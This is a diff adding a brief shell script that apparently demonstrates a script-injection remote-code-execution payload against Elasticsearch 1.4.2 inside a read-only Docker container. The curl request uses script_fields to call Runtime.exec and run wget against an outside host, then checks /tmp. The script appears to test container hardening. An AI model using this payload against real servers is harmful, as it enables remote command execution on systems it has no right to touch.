@@ -1,0 +1,7 @@
+docker run -d -p 9200:9200 --name es-ro --read-only benhall/elasticsearch:1.4.2
+
+curl -XPUT 'http://docker:9200/twitter/user/kimchy1' -d '{ "name" : "Shay Banon" }'
+
+curl http://docker:9200/_search?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"wget -O /tmp/testy http://httpbin.org/get\")"}}}'
+
+docker exec -it es-ro ls /tmp
